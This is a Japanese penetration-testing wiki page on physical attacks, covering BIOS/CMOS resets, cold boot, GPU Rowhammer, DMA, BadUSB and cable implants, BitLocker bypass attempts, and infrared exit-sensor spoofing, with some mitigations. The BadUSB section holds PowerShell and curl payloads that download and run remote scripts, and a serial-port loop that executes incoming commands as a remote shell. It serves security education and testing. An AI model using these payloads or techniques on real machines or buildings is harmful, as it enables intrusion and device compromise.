# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

## BIOS パスワードの復旧とシステムセキュリティ

旧式の PC ファームウェア設定は、CMOS バッテリーを取り外すか、マニュアルに記載された CMOS クリア用ジャンパーを使用することでリセットできる場合があります。必要な電源オフ時間はマザーボードによって異なります。また、最新の UEFI パスワードやキーは不揮発性フラッシュメモリ、組み込みコントローラー、またはセキュリティデバイスに保存されている可能性があり、バッテリーを取り外しても消去されないことがあります。ピンをショートさせる前に、マザーボードやサービス用のマニュアルを確認してください。この手順により、TPM の測定値が無効になり、ディスク暗号化のリカバリーが必要になる場合もあります。

旧式の x86 システムでは、**killCMOS** や **CmosPwd** などのツールを使い、ブート可能な環境から CMOS に保存された設定を調査または変更できます。CmosPwd は、文書化された旧式 BIOS ファミリーのパスワード形式を認識し、CMOS の状態をバックアップ、復元、消去、または破壊できます。公開されているビルドは、旧式の DOS/Windows、Linux、FreeBSD、NetBSD 環境を対象としています。<sup>[[18]](#references)</sup> これらのユーティリティは汎用的な UEFI パスワード解除ツールではなく、十分なハードウェア／ファームウェアへのアクセスが必要です。

一部のノート PC ファームウェアは、パスワード入力に何度か失敗すると、ベンダー固有のチャレンジコードを表示します。[bios-pw.org](https://bios-pw.org) などのデータベースは、一部モデルの旧式ベンダーリカバリーパスワードを導出できますが、多くのシステムでは、導出可能なチャレンジを伴わないロックアウトが実装されています。生成されたパスワードはモデル固有のものとして扱い、回数制限を使い切らないようにしてください。

### UEFI セキュリティ

最新の **UEFI** システムでは、CHIPSEC を使って Secure Boot 変数の保護を監査できます。まずは、以下の変更を加えないチェックを実行してください。オプションの `-a modify` モードは、意図的に変数の破損を試みるため、復旧可能なラボシステムでのみ使用してください。CHIPSEC 自体も、特権ドライバーと低レベルのハードウェアアクセスは本番環境のエンドポイントには適さないと警告しています。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM解析とCold Boot Attacks

DRAMは、リフレッシュが停止してもすべてのビットがすぐに失われるわけではありません。データの劣化速度はモジュールの技術や温度によって大きく異なり、冷却すれば、冷却しない電源再投入よりもはるかに長く有用なデータを保持できます。cold-boot攻撃では、小規模な取得環境へすばやく再起動するか、冷却したモジュールを移設してrawメモリを取得し、ビットの劣化があっても暗号鍵を復元します。ディスクコピー用ユーティリティが自動的に物理メモリのイメージャーになるわけではなく、Volatilityは取得ではなくキャプチャの解析を行います。プラットフォームに適した、検証済みの取得ツールを使用してください。<sup>[[12]](#references)</sup>

---

## ページテーブルを狙うGPU Rowhammer

最新のGPU Rowhammer攻撃は、通常のバッファではなく**GPU仮想メモリのメタデータ**を標的にすると、はるかに強力になります。**GDDR6を搭載したNVIDIA Ampere GPU**に関する近年の研究では、権限のないCUDAコードを実行する攻撃者が、GPU固有のハンマリングパターンを作成し、**memory massaging**を使ってページング構造を脆弱な行に配置し、**最終レベルのページテーブル**や中間の**ページディレクトリ**のビットを反転できることが示されています。単一の変換エントリが破損すれば、攻撃者は**任意のGPUメモリ読み取り／書き込み**を実現し、そこからホストの侵害へ移行できます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6の**ハンマリング可能な行をプロファイル**し、DRAM内の緩和策を回避する、リフレッシュを考慮した不均一なハンマリングパターンを作成します。
2. ドライバーがページ変換構造を既定の保護プールに置かず、ハンマリング可能な物理位置に配置するように**GPU割り当てを調整**します。実際には、低メモリのページテーブル領域を使い切り、制御されたストライドで大規模な疎UVMマッピングを大量に作成する方法があります。
3. ページテーブル／ページディレクトリエントリ内の**PFN**やアパーチャ関連ビットなどの**変換メタデータを反転**させ、攻撃者が制御する仮想ページがページテーブルページ、任意のGPUメモリ、またはホストから見えるシステムマッピングに解決されるようにします。
4. 偽造したマッピングを使って追加の変換エントリを書き換え、GPUコンテキストをまたぐ**任意のGPUメモリ読み取り／書き込み**へと権限を拡大します。

### ホストへの移行と緩和策

- **IOMMUが無効**の場合、偽造したシステムアパーチャマッピングによって、GPUから任意の**ホスト物理メモリ**を参照できる可能性があり、GPUプリミティブがホストの完全な侵害につながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**は最終レベルのページテーブルエントリを狙います。一方、**GeForge**では、1ビットの反転でより大きな変換サブツリーの参照先を変更できるため、ページディレクトリのレベルを破損させるほうが容易な場合があることが示されています。ページング層の1つだけをセキュリティ上重要と見なさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**は、GDDRHammer/GeForgeが利用するホストメモリへの直接的な任意アクセス経路を遮断するため、依然として重要ですが、**完全な緩和策ではありません**。**GPUBreach**は第2段階の移行を示しています。攻撃者はGPUから書き込み可能なドライバー所有のCPUバッファを破損させ、NVIDIAドライバーのメモリ安全性のバグを誘発して、IOMMUが有効でもカーネルへの書き込みプリミティブと**root shell**を得ます。<sup>[[3]](#references)</sup>
- 対応するワークステーション／サーバー向けGPUでは、**システムレベルECC**が実用的な強化策になります。ECCのないコンシューマー向けGPUでは、防御の選択肢が限られます。<sup>[[4]](#references)</sup>
- これらの攻撃は純粋な理論上のものではありません。**GeForge**はRTX 3060で**1,171**回、RTX A6000で**202**回のビット反転を報告しており、ホスト権限昇格の一連の攻撃を成立させるのに十分でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## ダイレクトメモリアクセス（DMA）攻撃

WindowsのDMA攻撃チェーンを可能にする、プリブートIOMMU適用のダウングレードを伴うオフラインのUEFI IFR/NVRAMパッチについては、次を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**は、FireWireや初期のThunderbolt構成などのインターフェースを介した**DMAベースのメモリ取得とパッチ適用**を実証しており、過去のログインバイパスのシグネチャも含まれています。単に「Windows 10には無効」というわけではありません。悪用可能性は、インターフェース、対象ビルド、IOMMUポリシー、ロック状態、Windows Kernel DMA Protectionのサポートと有効化の有無によって異なります。Windows 10 version 1803以降では、互換性のあるプラットフォームでKernel DMA Protectionが導入され、攻撃対象領域が大きく変化しました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USBによるシステムアクセス

暗号化されていない、またはすでにロック解除されているWindowsボリュームでは、オフライン環境から**sethc.exe**や**Utilman.exe**などのアクセシビリティ用バイナリを**cmd.exe**に置き換えることで、対応するログオン画面のショートカット実行時にSYSTEMコマンドプロンプトを起動できます。**chntpw**などのツールを使って、ローカルSAMアカウントのデータを編集することもできます。これらの方法はロックされたBitLockerボリュームを回避できず、DPAPI/EFSで保護された認証情報を破損させるおそれがあります。フォレンジック用コピーとバックアップを保全してください。

**Kon-Boot**は、対応するWindows/macOS構成向けの市販のブート時認証バイパスツールです。互換性はOS、ファームウェアモード、Secure Boot、ディスク暗号化の設定によって異なります。BitLockerでロックされたボリュームを復号することはできません。<sup>[[10]](#references)</sup>

---

## Windowsのセキュリティ機能への対処

### ブートおよび回復のショートカット

- **Delete/Supr**、F2、F10、またはベンダー固有のキーでファームウェア設定を開ける場合があります。
- **F8**で従来のWindows詳細ブートオプションを開けるのは、その経路が引き続き有効な構成に限られます。現在の回復画面への入り方は構成によって異なります。
- **Shift**を押し続けると、一部の構成ではWindowsの自動ログオンを抑止できます。ただし、ポリシーやレジストリ設定で無効にできる場合があります。<sup>[[17]](#references)</sup>

### BAD USBデバイス

**USB Rubber Ducky**やTeensyボードなどのデバイスは、信頼されたHIDキーボードとして認識され、事前に定義されたキー入力を注入できます。ペイロードが最初に得る権限とデスクトップアクセスは、ログオン中のセッションと同じです。UACプロンプト、画面ロック、キーボードレイアウト、タイミング、エンドポイントのUSBポリシーによる制約も受けます。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

管理者権限またはバックアップ権限があれば、シャドウコピーを作成するかレジストリハイブを保存し、**SAM**や**SYSTEM**などのロックされたファイルを取得できます。これは侵害後の収集手法であり、権限昇格の回避策ではありません。`diskshadow`/VSSのイベントやレジストリハイブのエクスポートイベントと照合してください。

## BadUSB / HIDインプラント技術

### NFCで起動するAndroid HID gadget

root化したAndroidスマートフォンをプログラム可能なUSBキーボードにできるのは、USBコントローラーとカーネルが**USB gadget/HIDサポート**を提供している場合に限られます。対応デバイスでは、Kali NetHunterの**USB Arsenal**からgadgetプロファイルを利用できます。別の方法として、[USB Gadget Tool](https://github.com/tejado/android-usb-gadget)を使うと、ConfigFS gadget機能を作成でき、`/dev/hidg0`や`/dev/hidg1`などのキーボード／マウス用キャラクターデバイスが利用可能になる場合があります。このツールが作成するのはgadgetエンドポイントだけであり、HIDレポートを書き込むには別のプロセスが必要です。root権限があっても、ConfigFS、HID gadgetサポート、または使用可能なUSB Device Controllerがないカーネルを補うことはできません。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

このエンドポイントは、物理的なトリガーとしてAndroid NFCと組み合わせることができます。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)アプリはタグのUIDを読み取り、想定される形式に変換し、ローカルの許可リストと照合します。一致すると、設定済みのRubber Ducky風キーボードシーケンスを送信します。接続されたホストには通常のキーボード入力として認識され、NFCソフトウェアは必要ありません。<sup>[[22]](#references)[[24]](#references)</sup>

ショートカットやコマンドを使う前に、空のテキストエディターでデバイスの認識とキーボードレイアウトを検証してください。無害なペイロードの例は次のとおりです。<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要な信頼境界:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist は識別であり、認証ではない**。UID は公開情報であり、一部のトークンの種類やエミュレーターでは複製やなりすましが可能です。許可済み UID をコピーすると、元のトークンと同じディスパッチ経路をたどります。
- **NfcScreenOff** Magisk module は NFC service にパッチを適用し、画面がオンでロック解除済みであるかのように動作させます。スマートフォンがすでにホストに接続されている場合、ロックを解除せずに誰かが payload を実行させることができます。
- payload に保存されたパスワード、API token、コマンドは、root 化または bootloader のロックが解除されたデバイス上では復元可能な秘密情報です。HID 経由でパスワードを入力するのは再利用可能なパスワードの自動入力であり、passwordless authentication ではありません。
- HID injection は、アクティブなデスクトップの権限で動作し、フォーカス、タイミング、ホストのキーボードレイアウトに依存します。機密性の高い操作をディスパッチする前に、直近のユーザー確認を必須にし、スクリプトに特権的な秘密情報を含めず、実際の認証には暗号学的な challenge-response authenticator を使用してください。

### Wi-Fi 管理型ケーブル implant

- **Evil Crow Cable Wind** などの ESP32-S3 ベースの implant は、USB-A→USB-C または USB-C↔USB-C ケーブルの内部に隠れ、USB keyboard としてのみ認識され、Wi-Fi 経由で C2 stack を公開します。攻撃者は、被害者のホストからケーブルに給電し、パスワード `123456789` の hotspot を `Evil Crow Cable Wind` という名前で作成し、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP address）を開くだけで、組み込みの HTTP interface にアクセスできます。<sup>[[8]](#references)</sup>
- ブラウザー UI には、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* のタブがあります。保存された payload には OS ごとのタグが付き、キーボードレイアウトは実行時に切り替えられ、VID/PID の文字列は既知の周辺機器を模倣するよう変更できます。
- C2 がケーブル内部にあるため、スマートフォンから payload の準備、実行のトリガー、Wi-Fi credentials の管理を、組織のネットワークを使わずに行えます。これは短時間の物理侵入に役立ちます。

### OS 対応 AutoExec payload

- AutoExec rules は、USB enumeration の直後に実行する1つ以上の payload を指定します。implant は軽量な OS fingerprinting を行い、一致する script を選択します。
- ワークフローの例:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）または `CTRL ALT T`（terminal）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 実行が無人で行われるため、充電ケーブルを差し替えるだけで、ログオン中のユーザーのコンテキストで「plug-and-pwn」の初期アクセスを実現できます。

### HID で起動する Wi-Fi TCP 経由の remote shell

1. **Keystroke bootstrap:** 保存済み payload が console を開き、新しい USB serial device に届いた内容を実行する loop を貼り付けます。Windows の最小限の例は次のとおりです。

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implantは、ESP32-S3がTCP client（Python script、Android APK、またはdesktop executable）を起動してoperatorに接続する間、USB CDC channelを開いたままにします。TCP sessionに入力されたバイト列は上記のserial loopに転送されるため、air-gapped hostでもremote command executionが可能です。出力は限られているため、operatorは通常、盲目的にコマンド（アカウント作成、追加ツールの配置など）を実行します。

### HTTP OTA update surface

- 文書化されているEvil Crow Cable Wind interfaceは、認証不要のfirmware-update endpoint `/update`を公開しています:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operatorsは、ケーブルを開けずに作業中でも機能をホットスワップできます（例: flash USB Army Knife firmware）。これにより、implantは対象ホストに接続したまま、新たな機能へpivotできます。

## BitLocker暗号化のバイパス

稼働中、または最近稼働していたシステムを許可を得てforensic acquisitionすると、ボリュームのロック解除中にBitLockerのボリュームマスターキーや関連するキー素材が含まれている場合があります。Elcomsoft Forensic Disk DecryptorやPassware Kit Forensicなどの商用ツールは、対応するmemory image、hibernation file、crash dumpを検索できますが、成功する保証はありません。BitLockerが有効な場合、最新のWindowsではcrash dumpも暗号化されます。また、保存された48桁のrecovery passwordは、メモリ内のボリュームキーとは別のartifactです。<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key追加のためのSocial Engineering

攻撃者は、管理者を説得してBitLocker管理コマンドを実行させ、recovery-password、external-key、または別のprotectorを追加して、それを取得することがあります。recovery passwordに任意のゼロ文字列は使用できません。BitLockerの数値recovery passwordは、検証済みの48桁形式である必要があります。許可された管理で使用する関連構文は`manage-bde -protectors -add C: -recoverypassword`です。追加されたprotectorは`manage-bde -protectors -get C:`で一覧表示できます。protectorの追加を監視し、新しいrecovery materialが承認済みの場所にのみ保管されるようにしてください。<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switchを悪用したBIOSのFactory Reset

最新のノートPCや小型デスクトップの多くには、Embedded Controller（EC）とBIOS/UEFI firmwareによって監視される**chassis-intrusion switch**が搭載されています。このswitchの主な目的は、デバイスが開かれたときに警告を発することですが、ベンダーによっては、特定のパターンでswitchを切り替えると起動する**非公開のrecovery shortcut**を実装しています。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻撃の仕組み

1. switchはECの**GPIO interrupt**に配線されています。
2. EC上で動作するfirmwareが、**押下のタイミングと回数**を記録します。
3. ハードコードされたパターンが認識されると、ECは*mainboard-reset*ルーチンを呼び出し、**システムのNVRAM/CMOSの内容を消去**します。
4. 次回起動時、該当モデルはリセットされたfirmware状態を読み込みます。ベンダーやrevisionによって、消去される状態にはsupervisor password、カスタムのboot設定、登録済みのSecure Boot keyが含まれる場合があります。TPMの状態とディスク暗号化への影響は、別途評価する必要があります。

> firmwareのリセットによって外部起動オプションが復元される場合がありますが、ストレージが**復号されるわけではありません**。BitLockerなどのfull-disk encryption systemは、TPM/firmwareの変更後にrecoveryを要求する場合がありますが、recovery keyがなくても内蔵ドライブを保護します。<sup>[[16]](#references)</sup>

### 実例 – Framework 13 Laptop

Framework 13（第11/12/13世代）のrecovery shortcutは次のとおりです。

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10回目のサイクル後、ECは次回の再起動時にBIOSがNVRAMを消去するよう指示するフラグを設定します。手順全体は約40秒で、**ドライバー以外は何も必要ありません**。<sup>[[5]](#references)</sup>

### 汎用的な悪用手順

1. 対象機器の電源を入れるか、サスペンドから復帰させてECを稼働させます。
2. 底面カバーを取り外し、侵入検知／メンテナンススイッチを露出させます。
3. ベンダー固有の切り替えパターンを再現します（ドキュメントやフォーラムを確認するか、ECファームウェアをリバースエンジニアリングします）。
4. 再組み立てして再起動し、実際に変更されたファームウェア設定と認証情報を確認します。
5. 許可を得ており、外部メディアからの起動が可能な場合は、管理下のLiveイメージを起動します。内部ボリュームが正当にロック解除されている（または暗号化されていなかった）場合、Live環境から認証情報やデータを取得したり、EFI System Partitionを調査したりできます。このパーティションを変更してEFI implantをインストールすると、変更は永続的になり、侵襲性も非常に高くなります。また、Secure Boot、measured boot、ファームウェアの書き込み保護、エンドポイント監視による制約も受けます。暗号化されたストレージは、鍵または復旧情報がなければアクセスできません。

### 検知と緩和策

* OS管理コンソールで筐体侵入イベントを記録し、予期しないBIOSリセットと関連付けます。
* ねじやカバーに**開封検知シール**を貼り、開封を検知します。
* デバイスは**物理的に管理された場所**に保管します。物理アクセスは完全な侵害につながるものと想定してください。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効にするか、NVRAMリセットに追加の暗号学的認証を要求します。

---

## 非接触型退出センサーに対するCovert IR Injection

### センサーの特性
- 一般的な「wave-to-exit」センサーは、近赤外線LEDエミッターとテレビのリモコンに使われるような受信モジュールを組み合わせています。このモジュールは、正しい搬送波（約30 kHz）のパルスを複数回（約4～10回）検出した後にのみ、ロジックHighを出力します。<sup>[[7]](#references)</sup>
- プラスチック製のシュラウドがエミッターとレシーバーの直接の向かい合いを遮るため、コントローラーは検証済みの搬送波が近距離の反射によるものだと判断し、ドアストライクを開くリレーを駆動する。
- コントローラーはターゲットの存在を認識すると、送信する変調エンベロープを変更することが多いが、レシーバーはフィルタリングされた搬送波に一致するバーストを引き続き受け入れる。

### 攻撃の手順
1. **発光プロファイルをキャプチャする** – コントローラーのピンにロジックアナライザーを接続し、内部 IR LED を駆動する、検出前と検出後の両方の波形を記録する。
2. **「検出後」の波形だけを再生する** – 標準のエミッターを取り外すか無効にし、最初からトリガー後のパターンで外部 IR LED を駆動する。レシーバーはパルス数／周波数だけを判定するため、偽装した搬送波を本物の反射として扱い、リレーラインをアサートする。
3. **送信をゲート制御する** – 調整したバースト（例：数十ミリ秒オン、同程度の時間オフ）で搬送波を送信し、レシーバーの AGC や干渉処理ロジックを飽和させずに必要最小限のパルス数を届ける。連続送信ではセンサーの感度がすぐに低下し、リレーが作動しなくなる。

### 長距離反射注入
- ベンチ用 LED を高出力 IR ダイオード、MOSFET ドライバー、集光光学系に置き換えることで、約 6 m 離れた場所から確実にトリガーできる。
- 攻撃者はレシーバーの開口部を見通せる位置にいる必要はない。ガラス越しに見える室内の壁、棚、ドア枠にビームを向ければ、反射光が約 30°の視野に入り、近距離で手を振ったように見せかけられる。
- レシーバーは弱い反射しか想定していないため、外部からの強力なビームは複数の面で反射しても、検出しきい値を上回る強さを保てる。

### 武器化した攻撃用懐中電灯
- ドライバーを市販の懐中電灯に組み込めば、ツールを目立たないように隠せる。可視光 LED をレシーバーの周波数帯に合った高出力 IR LED に交換し、ATtiny412（または同等品）を追加して約 30 kHz のバーストを生成し、MOSFET で LED 電流をシンクする。
- 伸縮式ズームレンズでビームを絞って射程と精度を高める。さらに MCU 制御の振動モーターを使えば、可視光を発せずに変調が有効になっていることを触覚で確認できる。
- 保存済みの複数の変調パターン（搬送波周波数とエンベロープを少しずつ変えたもの）を切り替えることで、ブランドを変更して販売されているセンサーファミリーとの互換性が高まる。これにより、リレーの作動音がしてドアが開くまで、反射面を順に照射できる。

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
